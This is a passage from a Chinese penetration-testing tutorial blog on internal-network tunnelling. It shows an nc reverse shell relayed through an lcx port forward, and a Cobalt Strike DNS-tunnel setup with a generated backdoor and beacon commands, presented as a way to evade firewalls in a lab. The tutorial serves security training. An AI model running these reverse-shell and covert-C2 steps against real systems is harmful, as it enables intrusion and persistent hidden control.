+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-16.png" alt="71-1"></p>
+<p>案例演示3-多向连接反弹shell-配合转发-反向</p>
+<p>环境：kali（76.132）–&gt;webserver（3.31、76.143）–&gt;sqlserver（3.32）</p>
+<p>&lt;1&gt;在Webserver上执行以下命令，把自己的2222端口给3333，并监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">god\Webserver：lcx.exe -listen 2222 3333</span><br></pre></td></tr></table></figure>
+
+<p>&lt;2&gt;在Sqlserver上执行以下命令，把cmd反弹给webserver的2222端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">god\Sqlserver：nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-17.png" alt="71-1"></p>
+<p>此时Webserver上监听到会话</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-18.png" alt="71-1"></p>
+<p>&lt;3&gt;在kali上执行以下命令，连接Webserver的3333端口，成功反弹shell，连接到Sqlserver。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali或本机：nc -v 192.168.76.143 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-19.png" alt="71-1"></p>
+<p><strong>案例5：应用层DNS隧道配合CS上线-检测,利用,说明</strong></p>
+<p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.云主机Teamserver配置端口53启用-udp</span><br><span class="line"> </span><br><span class="line">2.买一个域名修改解析记录如下：</span><br><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br><span class="line"> </span><br><span class="line">3.配置DNS监听器内容如下：</span><br><span class="line">ns1.xiaodi8.com</span><br><span class="line">ns2.xiaodi8.com</span><br><span class="line">cs.xiaodi8.com</span><br><span class="line"> </span><br><span class="line">4.生成后门执行上线后启用命令：</span><br><span class="line">beacon&gt; checkin</span><br><span class="line">[] Tasked beacon to checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line">[+] data channel set to DNS-TXT</span><br><span class="line">[+] host called home, sent: 8 bytes</span><br><span class="line">beacon&gt; shell whoami</span><br><span class="line">[] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 53 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">xiaodi-pc\xiaodi</span><br></pre></td></tr></table></figure>
+
+<p>应用层是在实战中经常用到的，之前两个层面会经常被防火墙拦截（网络&#x2F;传输层），下面用DNS隧道来实现 cs上线。</p>
+<p>cs的监听器对应着后门绑定的协议。常规是用http上线，dns比http速度要慢。当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀。因为dns是域名解析，这个协议一般都不会被拦截，数据通过dns协议给出去，一般也不会被拦截！</p>
+<p>我们在生成监听器的时候有个payload，可以选择不同的协议。网上还有插件，还可以有很多其他协议。</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-20.png" alt="71-1"></p>
+<p>案例演示</p>
+<p>&lt;1&gt;云主机Teamserver配置端口53启用-udp（只有阿里云主机有这个端口问题，其他主机一般没有）</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-21.png" alt="71-1"></p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-22.png" alt="71-1"></p>
+<p>&lt;2&gt;买一个域名修改解析记录如下：</p>
+<ul>
+<li>A记录-&gt;cs主机名-&gt;CS服务器IP</li>
+<li>NS记录-&gt;ns1主机名-&gt;上个A记录地址</li>
+<li>NS记录-&gt;ns2主机名-&gt;上个A记录地址</li>
+</ul>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-23.png" alt="71-1"></p>
+<p>&lt;3&gt;配置DNS监听器内容如下：ns1.xiaodi8.com、ns2.xiaodi8.com、cs.xiaodi8.com</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-24.png" alt="71-1"></p>
+<p>&lt;4&gt;配置完之后，启动监听器，如下</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-25.png" alt="71-1"></p>
+<p>&lt;5&gt;生成后门，attacks–&gt;packages–&gt;windows executable(s)–&gt;listener选择dns上线，勾选–&gt;选择后门生成位置–&gt;生成后门（dns_x.exe）</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-26.png" alt="71-1"></p>
+<p>&lt;6&gt;将后门上传到webserver，执行。执行后门后，cs出现一个黑窗口。</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-27.png" alt="71-1"></p>
+<p>&lt;7&gt;点击小图标，出现unknown主机，原因是我们使用DNS上线，DNS速度特别慢。此时我们需要再敲几条命令才能实现控制。</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-28.png" alt="71-1"></p>
+<p>&lt;8&gt;右击unknown主机，选择interact，启用命令。执行以下命令，等待一会儿就会上线成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-29.png" alt="71-1"></p>
+<p>一直没有成功，换本机测试，上线成功</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-30.png" alt="71-1"></p>
+<p>等待了许久，终于上线成功。图标上有闪电，说明对应的阿里云主机上存在一些防护措施。</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-31.png" alt="71-1"></p>
+<p>隧道技术其实就是不断变换协议，走不同协议来实现数据通信！！！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/">HVVL404</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/71-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&amp;%E4%BC%A0%E8%BE%93&amp;%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">http://blog.hvvl404.fun/2023/05/04/小迪安全/小迪安全（内网篇）/71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.hvvl404.fun" target="_blank">HVVL404</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/72-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CS&amp;MSF%E8%81%94%E5%8A%A8%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E8%AF%86/" title="72-内网安全-域横向CS&amp;MSF联动"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">72-内网安全-域横向CS&amp;MSF联动</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/69-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&amp;SPN&amp;RDP/" title="69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HVVL404</div><div class="author-info__description">欢迎来到我的博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E6%A1%88/" title="65-内网安全-域环境&amp;工作组&amp;局域网探针方案">65-内网安全-域环境&amp;工作组&amp;局域网探针方案</a><time datetime="2023-05-24T14:20:01.894Z" title="发表于 2023-05-24 22:20:01">2023-05-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%8B%BF%E4%B8%8BCNVD%E8%AF%81%E4%B9%A6%E5%BC%80%E6%BA%90&amp;%E9%97%AD%E6%BA%90&amp;%E5%94%AE%E5%8D%96%E7%B3%BB%E7%BB%9F/" title="88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统">88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</a><time datetime="2023-05-23T15:27:29.466Z" title="发表于 2023-05-23 23:27:29">2023-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E5%B9%B3%E5%8F%B0&amp;%E8%A7%84%E5%88%99&amp;%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/" title="86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化">86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</a><time datetime="2023-05-23T15:17:30.681Z" title="发表于 2023-05-23 23:17:30">2023-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E8%93%9D%E9%98%9Fatt&amp;ck&amp;IDS&amp;%E8%9C%9C%E7%BD%90&amp;%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" title="82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报">82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报</a><time datetime="2023-05-23T15:15:21.170Z" title="发表于 2023-05-23 23:15:21">2023-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E7%9B%91%E6%8E%A7&amp;%E4%B8%8D%E6%AD%BB%E9%A9%AC&amp;%E5%9E%83%E5%9C%BE%E5%8C%85&amp;%E8%B5%84%E6%BA%90%E5%BA%93/" title="81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库">81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库</a><time datetime="2023-05-23T15:11:59.107Z" title="发表于 2023-05-23 23:11:59">2023-05-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/bg.png')"><div id="footer-wrap"><div class="copyright">&copy;2023.4.27 - 2023 By HVVL404</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="http://blog.hvvl404.fun">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
